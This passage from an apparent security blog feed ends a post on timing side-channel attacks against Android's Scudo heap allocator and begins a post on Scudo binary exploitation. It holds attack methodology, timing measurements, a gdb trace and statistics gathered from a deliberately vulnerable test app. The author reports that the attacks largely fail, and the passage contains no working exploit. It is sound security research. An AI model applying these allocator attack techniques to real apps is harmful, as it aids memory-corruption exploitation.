&lt;li>In iteration &lt;code>j&lt;/code> perform 13 allocations (assuming classid 1 allocations, i.e. &lt;code>malloc(0x10)&lt;/code>). For each allocation let &lt;code>x_{i,j}&lt;/code> be the measured execution time (so &lt;code>0 &amp;lt;= i &amp;lt;= 12&lt;/code>).&lt;/li>
&lt;li>Add &lt;code>x_{i,j}&lt;/code> to the list &lt;code>X_i&lt;/code>.&lt;/li>
&lt;li>After &lt;code>0 &amp;lt;= j &amp;lt; num_iterations&lt;/code> 13 - chunk allocations, compute the average over each list. Let &lt;code>x_i'&lt;/code> be the average of &lt;code>X_i&lt;/code>&lt;/li>
&lt;li>Let &lt;code>k := argmax_{0&amp;lt;=i&amp;lt;=12} x_i'&lt;/code>&lt;/li>
&lt;li>Return &lt;code>k&lt;/code>&lt;/li>
&lt;/ol>
&lt;p>Consider the following visualization:
&lt;img src="https://lolcads.github.io/2024/07/scudo_1_single_threaded_expectation_attack.png" alt="Single Threaded Expectation Attack">&lt;/p>
&lt;p>From the diagram we can see that &lt;code>C-&amp;gt;Count = 4&lt;/code>. Now, if we start measuring the execution times, i.e. we get &lt;code>x_{0,0}&lt;/code> for &lt;code>C-&amp;gt;Count = 4&lt;/code>, &lt;code>x_{1,0}&lt;/code> for &lt;code>C-&amp;gt;Count = 3&lt;/code> etc. we can see that for &lt;code>C-&amp;gt;Count = 0&lt;/code> &lt;code>x_{4,0}&lt;/code> is the biggest value. Therefore, right after &lt;code>allocate&lt;/code> returns, the result &lt;code>k = 4&lt;/code> of the above attack corresponds to the index of the biggest value &lt;code>x_{4,0}&lt;/code>. Note that the second index is used to perform the 13 allocations multiple times in order to cancel out noise using the mean. Also, assuming that each call to &lt;code>malloc&lt;/code> via &lt;a href="#experimental-setup">&lt;code>handleMessage&lt;/code>&lt;/a> is only triggering this very &lt;code>malloc&lt;/code>, i.e. there is no other call to &lt;code>malloc&lt;/code> that influences &lt;code>C-&amp;gt;Count&lt;/code>, after the attack &lt;code>C-&amp;gt;Count&lt;/code> takes the same value it had before performing the attack (because &lt;code>C-&amp;gt;Count&lt;/code> is in mod 13 and we run &lt;code>13 * num_iterations&lt;/code> allocations, which is divisible by 13).&lt;/p>
&lt;p>Before the above attack, it may be beneficial to run a few allocations to ensure that &lt;a href="https://cs.android.com/android/platform/superproject/+/android-12.0.0_r31:external/scudo/standalone/primary64.h;l=333;drc=b45a2ea782074944f79fc388df20b06e01f265f7;bpv=1;bpt=1">&lt;code>populateFreeList&lt;/code>&lt;/a> is called. This will result in &lt;a href="#attacking-chunks-array">&lt;code>13&lt;/code>&lt;/a> chunks being available in &lt;code>C-&amp;gt;Chunks&lt;/code> and thus &lt;code>C-&amp;gt;Count = 13&lt;/code> right after &lt;a href="https://cs.android.com/android/platform/superproject/+/android-12.0.0_r31:external/scudo/standalone/local_cache.h;l=74;bpv=0;bpt=1">&lt;code>refill&lt;/code>&lt;/a> and &lt;code>C-&amp;gt;Count = 12&lt;/code> right after &lt;code>allocate&lt;/code> returns.&lt;/p>
&lt;p>The main problem is that the assumptions are too strong for this attack to work on a real - world app. I.e. there are multiple threads that run &lt;code>malloc(0x10)&lt;/code>. Therefore, the timings measured from the perspective of a single thread may be influenced by the following:&lt;/p>
&lt;ol>
&lt;li>Thread synchronization in &lt;a href="https://cs.android.com/android/platform/superproject/+/android-12.0.0_r31:external/scudo/standalone/combined.h;l=356;drc=b45a2ea782074944f79fc388df20b06e01f265f7">&lt;code>Allocator::allocate&lt;/code>&lt;/a>. I.e. if there is another thread currently allocating memory via the primary, then our thread is forced to wait until the critical section is unlocked.&lt;/li>
&lt;li>Between two calls to &lt;code>malloc(0x10)&lt;/code>, there may be an arbitrary amount of threads that run &lt;code>malloc(0x10)&lt;/code> due to scheduling. Therefore, the above attack, which assumes to be able to run 13 consecutive allocations in a row, is unlikely to work. This basically poisons the averages, which makes all of them look almost the same!&lt;/li>
&lt;li>Remote call to &lt;code>malloc&lt;/code> can trigger multiple allocations! Therefore, one measurement might decrease &lt;code>C-&amp;gt;Count&lt;/code> by two or more instead of one.&lt;/li>
&lt;/ol>
&lt;h4 id="multithreaded-timing---based-side-channel-attacks-on-primary">Multithreaded Timing - Based Side Channel Attacks on Primary&lt;/h4>
&lt;p>This section describes different approaches that aim to predict &lt;code>C-&amp;gt;Count&lt;/code> based on measured timings in a multithreaded environment.&lt;/p>
&lt;h5 id="learn-distribution-from-leaked-counts">Learn Distribution from Leaked Counts&lt;/h5>
&lt;p>Let &lt;code>c_i&lt;/code> for &lt;code>0 &amp;lt;= i &amp;lt; n&lt;/code> be the leaked values for &lt;code>C-&amp;gt;Count&lt;/code> from one thread (with fixed TSD) right before each &lt;code>malloc(0x10)&lt;/code>. Notice that due to multithreading, this leaked value might differ from the value that is used in the following &lt;code>malloc&lt;/code> call. We assume that the probability for this is negligible though.&lt;/p>
&lt;p>Then compute for &lt;code>0 &amp;lt;= i &amp;lt; n-1&lt;/code> the difference of the &lt;code>C-&amp;gt;Count&lt;/code> values, i.e. &lt;code>d_i = -(c_{i+1} - c_{i}) mod 13&lt;/code>. With high probability, the &lt;code>d_i&lt;/code> represent the amount of &lt;code>malloc(0x10)&lt;/code> calls performed by other threads between each pair of &lt;code>malloc(0x10)&lt;/code> calls performed by our thread. Remember that the &lt;code>c_i&lt;/code> are leaked from our main thread.&lt;/p>
&lt;p>Construct the probability distribution according to the frequencies of the &lt;code>d_i&lt;/code> values. It is expected to be binomially distributed. Then, apply those probabilities to the timings. I.e. between each consecutive pair of time measurements &lt;code>x_i&lt;/code> and &lt;code>x_{i+1}&lt;/code> there is a random variable &lt;code>D_i&lt;/code> distributed according to the above distribution.&lt;/p>
&lt;p>Assuming we have a sequence of values for &lt;code>C-&amp;gt;Count&lt;/code> that is unknown, then every element in this unknown sequence can be represented as a random variable. To be precise, letting &lt;code>C_i&lt;/code> be the random variables representing the &lt;code>C-&amp;gt;Count&lt;/code> before the i-th &lt;code>malloc(0x10)&lt;/code>:&lt;/p>
&lt;pre tabindex="0">&lt;code>C_{i+1} = C_i + D_i = C_i + D // for all i: D_i are iid., so D~freq{d_i} is enough
&lt;/code>&lt;/pre>&lt;p>Assuming that there is an anchor point, i.e. there exists a constant value &lt;code>0 &amp;lt;= C_0 &amp;lt; 13&lt;/code> that is the first value for &lt;code>C-&amp;gt;Count&lt;/code>, then&lt;/p>
&lt;pre tabindex="0">&lt;code>C_{i+1} = C_i + D = (((C_0 + D) + D) + ... ) + D = C_0 + (i + 1) * D
=&amp;gt; E[C_{i+1}] = C_0 + (i+1) * E[D] = C_0 + (i+1) * (1/(n-1) * sum(d_i))
&lt;/code>&lt;/pre>&lt;p>Given a sequence of timings &lt;code>x_i&lt;/code> for &lt;code>0 &amp;lt;= i &amp;lt; m&lt;/code> measured by calling &lt;code>malloc(0x10)&lt;/code>, we could try to identify an anchor point, i.e. a point where &lt;code>refill&lt;/code> was triggered by e.g. taking &lt;code>max(x_i)&lt;/code>. If we get &lt;code>x_k = max(x_i)&lt;/code>, then we performed &lt;code>k + 1&lt;/code> allocations in order to get to this maximum value. Therefore, we could try to compute &lt;code>E[C_k]&lt;/code> to get the expected value for &lt;code>C-&amp;gt;Count&lt;/code>, which is based on the above formula.&lt;/p>
&lt;p>Unfortunately, there are some problems with this approach:&lt;/p>
&lt;ol>
&lt;li>Does not take into account that other threads still run &lt;code>malloc(0x10)&lt;/code> in the background. Although this approach &lt;em>might&lt;/em> work for computing the most probable value for &lt;code>C-&amp;gt;Count&lt;/code>, it would be invalidated the moment another thread called &lt;code>malloc(0x10)&lt;/code>.&lt;/li>
&lt;li>Probabilistic approach&amp;hellip;in practice, this will most likely not be that much better than just guessing the value, because there are only so few possible values &lt;code>C-&amp;gt;Count&lt;/code> can take.&lt;/li>
&lt;/ol>
&lt;h5 id="learn-thresholds">Learn Thresholds&lt;/h5>
&lt;p>Another approach is to learn thresholds that distinguish a &amp;ldquo;refill - timing&amp;rdquo; from any other timing. Thus we will try to &amp;ldquo;learn&amp;rdquo; a threshold that allows for separating timings into either &amp;ldquo;refill&amp;rdquo; or &amp;ldquo;non - refill&amp;rdquo;. Although this approach might be too &amp;ldquo;simple&amp;rdquo;, because the problem can also be interpreted as distinguishing at least two guassian distributions, we can give it a try.&lt;/p>
&lt;p>Initially, every thread is assigned to a &lt;code>TSD&lt;/code> (linked to a cache, i.e. the &lt;code>Chunks&lt;/code> array used in e.g. &lt;a href="https://cs.android.com/android/platform/superproject/+/android-12.0.0_r31:external/scudo/standalone/local_cache.h;drc=b45a2ea782074944f79fc388df20b06e01f265f7;bpv=0;bpt=0;l=66">&lt;code>allocate&lt;/code>&lt;/a>, which is based on the primary) in a &lt;a href="https://cs.android.com/android/platform/superproject/+/android-12.0.0_r31:external/scudo/standalone/tsd_shared.h;l=157;drc=b45a2ea782074944f79fc388df20b06e01f265f7;bpv=0;bpt=1">round - robin fashion&lt;/a>. As experience showed that the app often has at least 20 threads, and &lt;a href="https://cs.android.com/android/platform/superproject/+/android-12.0.0_r31:external/scudo/standalone/tsd_shared.h;l=33;drc=b45a2ea782074944f79fc388df20b06e01f265f7;bpv=0;bpt=1">&lt;code>NumberOfTSDs&lt;/code>&lt;/a> is either &lt;a href="https://cs.android.com/android/platform/superproject/+/android-12.0.0_r31:external/scudo/standalone/allocator_config.h;l=109">&lt;code>DefaultTSDCount = 2&lt;/code>&lt;/a> or &lt;a href="https://cs.android.com/android/platform/superproject/+/android-12.0.0_r31:external/scudo/standalone/linux.cpp;drc=b45a2ea782074944f79fc388df20b06e01f265f7;bpv=0;bpt=1;l=137">&lt;code>getNumberOfCPUs&lt;/code>&lt;/a>, which on the test system can at most be &lt;code>8&lt;/code>, we can conclude that there are multiple threads referencing the same TSD. This is still better than having &lt;strong>all&lt;/strong> threads sharing a single TSD!&lt;/p>
&lt;p>As the UAF module (see previous posts on &lt;em>Use - After - Free&lt;/em>) suggests that the current &lt;code>TSD&lt;/code> of the JNI thread &amp;ldquo;rarely&amp;rdquo; changes (due to exploitation of the UAF module working almost always), in the following we will assume that we use the same TSD. We will also assume that there either is no other thread that references the current &lt;code>TSD&lt;/code> or is at least one such thread, but this thread does not allocate often from the primary with classid 1.&lt;/p>
&lt;p>Performing only primary allocations of size &lt;code>0x10&lt;/code>, i.e. repeatedly calling a JNI function that calls &lt;code>malloc(0x10)&lt;/code>, results in the following plot:
&lt;img src="https://lolcads.github.io/2024/07/scudo_1_primary_alloc_only_4000_1.png" alt="Primary Allocations(only) in form of malloc(0x10)">&lt;/p>
&lt;p>Further analysis of this plot reveals the following issues:&lt;/p>
&lt;ol>
&lt;li>
&lt;p>There might exist 3 distinct distributions. I.e. it is possible to almost reliably (i.e. with high probability (whp)) differentiate between three different kinds of timings. This suggests that the types of timings are:&lt;/p>
&lt;ol>
&lt;li>&lt;code>refill&lt;/code> is called. Expected to be linked to the distribution with the highest mean.
&lt;ol>
&lt;li>&lt;a href="https://cs.android.com/android/platform/superproject/+/android-12.0.0_r31:external/scudo/standalone/primary64.h;l=102;drc=b45a2ea782074944f79fc388df20b06e01f265f7">&lt;code>popBatch&lt;/code>&lt;/a> has a batch in the free list&lt;/li>
&lt;li>&lt;code>popBatch&lt;/code> has to call &lt;a href="https://cs.android.com/android/platform/superproject/+/android-12.0.0_r31:external/scudo/standalone/primary64.h;drc=b45a2ea782074944f79fc388df20b06e01f265f7;l=333">&lt;code>populateFreeList&lt;/code>&lt;/a> &amp;ndash;&amp;gt; expected to take &lt;strong>a lot of time&lt;/strong>.&lt;/li>
&lt;/ol>
&lt;/li>
&lt;li>&lt;code>getTSDAndLock&lt;/code> takes longer, i.e. synchronization blocks execution.&lt;/li>
&lt;li>&lt;code>allocate&lt;/code> instantly returns a chunk.&lt;/li>
&lt;/ol>
&lt;p>Notice that currently, there is &lt;strong>NO CERTAIN MAPPING&lt;/strong> between the first two types of timings and the two distributions with the highest means. However, whp. the distribution with the lowest mean is linked to the event that &lt;code>allocate&lt;/code> instantly returns a chunk.&lt;/p>
&lt;/li>
&lt;li>
&lt;p>Assuming the distribution with the smallest mean is linked to the event that &lt;code>allocate&lt;/code> instantly returns a chunk and that at least one distribution is caused by multithreading, then with probability at least &lt;code>min(1394 / 4000, 1787 / 4000) = min(0.3485, 0.44675)&lt;/code> the TSD is shared with another thread.&lt;/p>
&lt;/li>
&lt;li>
&lt;p>Another &amp;ldquo;distortion&amp;rdquo; that could appear, but is very improbable, is that &lt;a href="https://cs.android.com/android/platform/superproject/+/android-12.0.0_r31:external/scudo/standalone/combined.h;l=505;drc=b45a2ea782074944f79fc388df20b06e01f265f7;bpv=0;bpt=1">&lt;code>crc32&lt;/code>&lt;/a> calculation takes &lt;strong>very&lt;/strong> long for specific values. As this has been empirically tested, this can be ruled out for now (I searched for values, which cause long execution times in the &lt;code>crc32&lt;/code> instruction&amp;hellip; without success).&lt;/p>
&lt;/li>
&lt;li>
&lt;p>Calling JNI functions can non - deterministically cause longer execution times e.g. by calling &lt;code>malloc&lt;/code> internally.&lt;/p>
&lt;/li>
&lt;/ol>
&lt;p>If the amount of points in the two distributions with the highest means are proportional to the total amount of points, then this rules out the possibility that the free list is filled with a lot of batches initially, because there can only be a constant amount of batches initially stored in the free list. Therefore, increasing the amount of allocations will reveal whether the amount of points in both distributions grows with the amount of allocations.&lt;/p>
&lt;p>Also, notice that our thread will permanently allocate memory via &lt;code>malloc(0x10)&lt;/code>. If there was another thread that freed memory using &lt;code>free&lt;/code> on previously allocated classid - 1 chunks (assuming no memory leaks), then this cannot create a new batch, i.e. result in &lt;code>drain&lt;/code> and therefore &lt;code>pushBatch&lt;/code> being called, because our thread will not call &lt;code>free&lt;/code> at all (of course there might be implicit calls to &lt;code>free&lt;/code>, but they would not be part of &lt;em>Scudo&lt;/em>). In addition to that, as Java threads have a 1 - 1 mapping with user - level threads (&lt;code>pthread_create&lt;/code>), there cannot be multiple threads running &lt;code>handleMessage&lt;/code>.&lt;/p>
&lt;p>Interestingly, it turns out that one call to the JNI function may cause multiple internal &lt;code>malloc&lt;/code> calls from the same or a TSD - sharing thread. E.g., if each remote &lt;code>malloc&lt;/code> resulted in two malloc calls, i.e. one internal call and the call we requested, then, assuming &lt;code>C-&amp;gt;Count &amp;lt; 13&lt;/code>, there will be six fast calls and one slow call. The timings used for analysis so far may contain multiple &lt;code>malloc&lt;/code> calls, which explains the existence of three distributions. Two of those three distributions are actually the same only with shifted means, one contains the timings with only one &lt;code>malloc&lt;/code>, the other one with two calls to &lt;code>malloc&lt;/code>. This is due to the fact that &lt;code>handleMessage&lt;/code> seems to call &lt;code>malloc&lt;/code> at most twice, but at least once. Therefore, the distributions with the smallest and biggest means seem to represent one &lt;code>malloc&lt;/code> and two mallocs without refill respectively, whereas the &amp;ldquo;middle&amp;rdquo; distribution seems to represent a single allocation with refill&amp;hellip;although this does not really make sense, because there would have to be a lot of refills&amp;hellip;&lt;/p>
&lt;p>In order to prove that synchronization is an issue and that one call to &lt;code>handleMessage&lt;/code> can cause two &lt;code>malloc&lt;/code> calls, consider the following analysis (performed via gdb):&lt;/p>
&lt;pre tabindex="0">&lt;code>&amp;lt;Index of handleMessage call&amp;gt;(length = &amp;lt;amount cache allocations per handleMessage&amp;gt;):
&amp;lt;Thread ID&amp;gt;: count=&amp;lt;C-&amp;gt;Count value&amp;gt;, id=&amp;lt;Class ID&amp;gt;
0(length = 0):
1(length = 1):
20: count=0xb, id=0x00000020
2(length = 2):
20: count=0xa, id=0x00000020
20: count=0x9, id=0x00000020
3(length = 1):
20: count=0x8, id=0x00000020
4(length = 2):
20: count=0x7, id=0x00000020
20: count=0x6, id=0x00000020
5(length = 0):
6(length = 0):
7(length = 2):
20: count=0x5, id=0x00000020
20: count=0x4, id=0x00000020
8(length = 2):
20: count=0x3, id=0x00000020
20: count=0x2, id=0x00000020
9(length = 1):
20: count=0x1, id=0x00000020
10(length = 1):
20: count=0x0, id=0x00000020
11(length = 1):
20: count=0xc, id=0x00000020
12(length = 1):
20: count=0xb, id=0x00000020
13(length = 0):
14(length = 2):
20: count=0xa, id=0x00000020
20: count=0x9, id=0x00000020
15(length = 0):
16(length = 0):
17(length = 1):
20: count=0x8, id=0x00000020
18(length = 1):
20: count=0x7, id=0x00000020
19(length = 0):
20(length = 2):
20: count=0x6, id=0x00000020
20: count=0x5, id=0x00000020
21(length = 1):
20: count=0x4, id=0x00000020
22(length = 1):
20: count=0x3, id=0x00000020
23(length = 0):
24(length = 1):
20: count=0x2, id=0x00000020
25(length = 1):
20: count=0x1, id=0x00000020
26(length = 0):
27(length = 2):
20: count=0x0, id=0x00000020
20: count=0xc, id=0x00000020
28(length = 1):
20: count=0xb, id=0x00000020
29(length = 1):
20: count=0xa, id=0x00000020
30(length = 0):
31(length = 0):
32(length = 2):
20: count=0x9, id=0x00000020
20: count=0x8, id=0x00000020
33(length = 1):
20: count=0x7, id=0x00000020
34(length = 1):
20: count=0x6, id=0x00000020
35(length = 3):
20: count=0x5, id=0x00000020
5: count=0x5, id=0x00000020
20: count=0x4, id=0x00000020
36(length = 2):
20: count=0x3, id=0x00000020
20: count=0x2, id=0x00000020
37(length = 2):
20: count=0x1, id=0x00000020
20: count=0x0, id=0x00000020
38(length = 2):
20: count=0xc, id=0x00000020
20: count=0xb, id=0x00000020
39(length = 2):
20: count=0xa, id=0x00000020
20: count=0x9, id=0x00000020
40(length = 0):
41(length = 0):
42(length = 1):
20: count=0x8, id=0x00000020
43(length = 1):
20: count=0x7, id=0x00000020
44(length = 2):
20: count=0x6, id=0x00000020
20: count=0x5, id=0x00000020
45(length = 0):
46(length = 0):
47(length = 1):
20: count=0x4, id=0x00000020
48(length = 0):
49(length = 1):
20: count=0x3, id=0x00000020
50(length = 1):
20: count=0x2, id=0x00000020
51(length = 1):
20: count=0x1, id=0x00000020
52(length = 2):
20: count=0x0, id=0x00000020
20: count=0xc, id=0x00000020
53(length = 0):
54(length = 0):
55(length = 0):
56(length = 1):
20: count=0xb, id=0x00000020
57(length = 1):
20: count=0xa, id=0x00000020
58(length = 1):
20: count=0x9, id=0x00000020
59(length = 2):
20: count=0x8, id=0x00000020
20: count=0x7, id=0x00000020
60(length = 0):
61(length = 2):
20: count=0x6, id=0x00000020
20: count=0x5, id=0x00000020
62(length = 0):
63(length = 0):
64(length = 0):
65(length = 0):
66(length = 1):
20: count=0x4, id=0x00000020
67(length = 1):
20: count=0x3, id=0x00000020
68(length = 1):
20: count=0x2, id=0x00000020
69(length = 0):
70(length = 1):
20: count=0x1, id=0x00000020
71(length = 0):
72(length = 1):
20: count=0x0, id=0x00000020
73(length = 1):
20: count=0xc, id=0x00000020
74(length = 1):
20: count=0xb, id=0x00000020
75(length = 1):
20: count=0xa, id=0x00000020
76(length = 2):
20: count=0x9, id=0x00000020
20: count=0x8, id=0x00000020
77(length = 2):
20: count=0x7, id=0x00000020
20: count=0x6, id=0x00000020
78(length = 8):
5: count=0x5, id=0x00000020
5: count=0x4, id=0x00000020
5: count=0x3, id=0x00000020
5: count=0x2, id=0x00000020
5: count=0x2, id=0x00000020
5: count=0x2, id=0x00000020
5: count=0x2, id=0x00000020
20: count=0x4, id=0x00000020
79(length = 3):
5: count=0x4, id=0x00000020
20: count=0x4, id=0x00000020
20: count=0x3, id=0x00000020
80(length = 1):
20: count=0x2, id=0x00000020
81(length = 2):
20: count=0x1, id=0x00000020
20: count=0x0, id=0x00000020
82(length = 1):
20: count=0xc, id=0x00000020
83(length = 2):
20: count=0xb, id=0x00000020
20: count=0xa, id=0x00000020
84(length = 2):
20: count=0x9, id=0x00000020
20: count=0x8, id=0x00000020
85(length = 0):
86(length = 2):
20: count=0x7, id=0x00000020
20: count=0x6, id=0x00000020
87(length = 1):
20: count=0x5, id=0x00000020
88(length = 1):
20: count=0x4, id=0x00000020
89(length = 1):
20: count=0x3, id=0x00000020
90(length = 1):
20: count=0x2, id=0x00000020
91(length = 0):
92(length = 0):
93(length = 1):
20: count=0x1, id=0x00000020
94(length = 2):
20: count=0x0, id=0x00000020
20: count=0xc, id=0x00000020
95(length = 2):
20: count=0xb, id=0x00000020
20: count=0xa, id=0x00000020
96(length = 0):
97(length = 1):
20: count=0x9, id=0x00000020
&lt;/code>&lt;/pre>&lt;p>Thread 20 is the main thread calling &lt;code>handleMessage&lt;/code>. Its allocations are interleaved with allocations from thread 5. Notice that there are &lt;strong>no&lt;/strong> inconsistencies in the above measurement, although it seems impossible for count to stay the same. This is due to thread 5 calling &lt;code>free&lt;/code> in between calls to &lt;code>malloc&lt;/code>.&lt;/p>
&lt;p>Therefore, there is at least one other thread sharing the same TSD as our thread. As execution in &lt;code>gdb&lt;/code> is &amp;ldquo;weird&amp;rdquo; sometimes, it can be assumed that multi - threading is even worse if no debugger is present. Overall, with at least one other thread interleaving and with uncertainty whether one call to &lt;code>handleMessage&lt;/code> results in one or two calls to &lt;code>malloc&lt;/code>, there seems to be no clear path to derive the actual value for &lt;code>C-&amp;gt;Count&lt;/code>.&lt;/p>
&lt;h5 id="analysing-accurate-measurements">Analysing Accurate Measurements&lt;/h5>
&lt;p>Performing timing analysis on the actual device, i.e. in the form of&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-C" data-lang="C">clock_gettime(CLOCK_THREAD_CPUTIME_ID, &lt;span style="color:#f92672">&amp;amp;&lt;/span>before);
ptr &lt;span style="color:#f92672">=&lt;/span> malloc(size);
clock_gettime(CLOCK_THREAD_CPUTIME_ID, &lt;span style="color:#f92672">&amp;amp;&lt;/span>after);
elapsed &lt;span style="color:#f92672">=&lt;/span> (after.tv_sec &lt;span style="color:#f92672">*&lt;/span> NS_PER_SECOND &lt;span style="color:#f92672">+&lt;/span> after.tv_nsec) &lt;span style="color:#f92672">-&lt;/span> (before.tv_sec &lt;span style="color:#f92672">*&lt;/span> NS_PER_SECOND &lt;span style="color:#f92672">+&lt;/span> before.tv_nsec);
&lt;/code>&lt;/pre>&lt;/div>&lt;p>reveals an interesting and quite natural result:
&lt;img src="https://lolcads.github.io/2024/07/scudo_1_primary_alloc_local_3316.png" alt="Time Measurements performed locally on the emulator">&lt;/p>
&lt;p>Mapping three distributions to the same set of measurements yields:
&lt;img src="https://lolcads.github.io/2024/07/scudo_1_primary_alloc_local_3316_3_dist.png" alt="Time Measurements performed locally on the emulator (3 distributions)">.&lt;/p>
&lt;p>Notice that these measurements are stripped off multiple layers of noise:&lt;/p>
&lt;ol>
&lt;li>Noise introduced by remote communication&lt;/li>
&lt;li>Noise introduced by an arbitrary amount of function calls required for e.g. setting up a JNI call.&lt;/li>
&lt;li>Some synchronization of threads. Notice that measuring the elapsed time for &lt;code>malloc(0x10)&lt;/code> directly requires no further data fetching and therefore less threads are involved&amp;hellip;&lt;/li>
&lt;/ol>
&lt;h3 id="attacking-secondary-cache">Attacking Secondary Cache&lt;/h3>
&lt;p>Naturally, we could also try to attack &lt;strong>the&lt;/strong> secondary cache via a timing attack. As with classical cache - based side channel attacks, we would expect:&lt;/p>
&lt;ol>
&lt;li>fast execution time, if entry is in cache, i.e. &lt;em>cache hit&lt;/em>&lt;/li>
&lt;li>slow execution time, if entry is &lt;strong>not&lt;/strong> in cache, i.e. &lt;em>cache miss&lt;/em>&lt;/li>
&lt;/ol>
&lt;p>Unfortunately, my experiments have been shut down by the fact that &lt;strong>there is only one secondary for all threads&lt;/strong>. From experience, &lt;em>damnvulnerableapp:VulnerableActivity&lt;/em> uses at least 20 threads. The experiment consisted of two events, i.e. &lt;em>cache hit&lt;/em> and &lt;em>cache miss&lt;/em>:&lt;/p>
&lt;ol>
&lt;li>
&lt;p>&lt;em>cache hit&lt;/em>:&lt;/p>
&lt;p>For the experiment, we repeat n times:&lt;/p>
&lt;ol>
&lt;li>Allocate chunk via secondary&lt;/li>
&lt;li>Free chunk&lt;/li>
&lt;li>Measure time required in 1.&lt;/li>
&lt;/ol>
&lt;p>From the second iteration onwards, assuming no other threads steals the freed chunk from the cache, allocations are assumed to be fast. Statistics are taken over 400 measurements (repeated three times):&lt;/p>
&lt;ol>
&lt;li>avg = 351142.4975, var = 6215682405.529994, standard dev = 78839.59922228166; Without first: avg = 350635.6090225564, var = 6128486185.496259, standard dev = 78284.64846632614`&lt;/li>
&lt;li>avg = 293603.4925, var = 9048178621.879944, standard dev = 95121.91451963078; Without first entry: 292885.1203007519, 8864432314.622118, 94151.11425056061&lt;/li>
&lt;li>avg = 343784.9075, var = 8457856232.698944, standard dev = 91966.60389890966; Without first entry: 343308.24812030076, 8388172201.665255, 91586.96523886603&lt;/li>
&lt;/ol>
&lt;/li>
&lt;li>
&lt;p>&lt;em>cache miss&lt;/em>:&lt;/p>
&lt;p>For the experiment, we repeat n times:&lt;/p>
&lt;ol>
&lt;li>Allocate chunk via secondary&lt;/li>
&lt;li>Measure time required in 1.&lt;/li>
&lt;/ol>
&lt;p>In the worst case, the first 32 allocations are covered by cache entries. Assuming that no other thread frees a lot of memory that results in chunks, which cover our requests, we end up with the following results (over 400 measurements, repeated twice):&lt;/p>
&lt;ol>
&lt;li>avg = 353609.1975, var = 7648425849.838493, standard dev = 87455.27914219069; Without first 32 entries: 354754.0652173913, 7595866298.691399, 87154.26724315567&lt;/li>
&lt;li>avg = 320303.5725, var = 7655033941.299744, standard dev = 87493.05081719201; Without first 32 entries: 320182.16576086957, 7793835282.176328, 88282.70092252687&lt;/li>
&lt;/ol>
&lt;/li>
&lt;/ol>
&lt;p>As can be seen from the repeated experiments, there seems to be no clear way for distinguishing secondary cache hits and misses. This might be due to the fact that there are roughly 20 threads sharing the same 32 cache entries! If we knew the distribution behind some random variable &lt;code>X&lt;/code> that represents the amount of secondary &lt;code>allocate&lt;/code> calls done in between two allocations performed by our thread, then we might be able to derive a probability distribution on the measured timings and maybe derive the most probable outcome, i.e. either cache hit or miss. But this seems like a rabbit hole, i.e. it does not seem to help in exploiting &lt;em>Scudo&lt;/em>.&lt;/p>
&lt;h2 id="conclusion">Conclusion&lt;/h2>
&lt;p>So, what is the result of the above &amp;ldquo;attacks&amp;rdquo; that do not really achieve anything&amp;hellip; Well, I argue that we actually achieved something without knowing that we achieved it, i.e. we can identify whether there are sometimes one and sometimes two calls to &lt;code>malloc&lt;/code> when running &lt;code>handleMessage&lt;/code>.&lt;/p>
&lt;p>Recall the visualization of the measurements:
&lt;img src="https://lolcads.github.io/2024/07/scudo_1_primary_alloc_only_4000_1.png" alt="Primary Allocations(only) in form of malloc(0x10)">&lt;/p>
&lt;p>Of course, the above diagram is composed of measuring only 4000 execution times. Still, we can tell whether a new time measurement belongs to either the red or the blue distribution with high probability, if the assumption is correct that the red and blue distributions represent one and two calls to &lt;code>malloc&lt;/code>, respectively! Adding to the pile, being able to distinguish time measurements like shown in the diagram suggests that there is some underlying information to be extracted. Notice that the distributions shown in the diagram come from time measurements taken over a JNI call and not a &lt;code>malloc&lt;/code> call directly!&lt;/p>
&lt;p>As can be seen from the measurements taken &lt;a href="#analysing-accurate-measurements">locally&lt;/a>, &lt;em>Scudo&lt;/em> leaks information through execution times and thus is not designed to mitigate timing attacks. Further analyses are required to apply and evaluate the whole potential of side channel attacks on &lt;em>Scudo&lt;/em>.&lt;/p>
&lt;p>Unfortunately, I am neither a data scientist nor an expert in statistics or side channel attacks. Hence, the analyses conducted in this blog post are very basic and, again, might be incorrect and/or incomplete.&lt;/p>
&lt;p>Therefore, attacking &lt;em>Scudo&lt;/em> in terms of timing attacks has to be postponed until a corresponding expert joins the game.&lt;/p></content></item><item><title>Scudo, the Allocator (Part 1)</title><link>https://lolcads.github.io/posts/2024/07/scudo_0/</link><pubDate>Thu, 25 Jul 2024 16:46:21 +0100</pubDate><guid>https://lolcads.github.io/posts/2024/07/scudo_0/</guid><description>Binary Exploitation for Scudo Heap Allocator on Android In this series of blog posts, we will investigate how an attacker may leverage the internals of the Scudo Allocator in order to obtain an advantage on an Android OS. To that end, necessary prerequisites will be discussed and analysed for their likelihood. The focus will primarily be on malloc and free, although realloc and other functions may also be of interest. According to source code, the Scudo version considered in this blog is 161cca266a9d0b6deb5f1fd2de8ad543649a7fa1.</description><content>&lt;h1 id="binary-exploitation-for-scudo-heap-allocator-on-android">Binary Exploitation for &lt;em>Scudo Heap Allocator&lt;/em> on Android&lt;/h1>
&lt;p>In this series of blog posts, we will investigate how an attacker may leverage the internals of the &lt;a href="https://cs.android.com/android/platform/superproject/+/android-12.0.0_r31:external/scudo/standalone/">&lt;em>Scudo Allocator&lt;/em>&lt;/a> in order to obtain an advantage on an Android OS. To that end, necessary prerequisites will be discussed and analysed for their likelihood. The focus will primarily be on &lt;a href="https://cs.android.com/android/platform/superproject/+/android-12.0.0_r31:external/scudo/standalone/wrappers_c.inc;l=57">&lt;code>malloc&lt;/code>&lt;/a> and &lt;a href="https://cs.android.com/android/platform/superproject/+/android-12.0.0_r31:external/scudo/standalone/wrappers_c.inc;l=35">&lt;code>free&lt;/code>&lt;/a>, although &lt;a href="https://cs.android.com/android/platform/superproject/+/android-12.0.0_r31:external/scudo/standalone/wrappers_c.inc;l=122">&lt;code>realloc&lt;/code>&lt;/a> and other functions may also be of interest. According to &lt;a href="https://cs.android.com/android/platform/superproject/+/android-12.0.0_r31:external/scudo/METADATA;l=19;drc=45e1036faa0dcfa30a01982880be1137d441333d">source code&lt;/a>, the Scudo version considered in this blog is &lt;code>161cca266a9d0b6deb5f1fd2de8ad543649a7fa1&lt;/code>.&lt;/p>
&lt;p>If you have no idea about the fundamentals of &lt;em>Scudo&lt;/em>, try reading the linked code! The followup blog post discusses &lt;em>timing side channel attacks&lt;/em> on Scudo and requires some of the basics discussed in this post.&lt;/p>
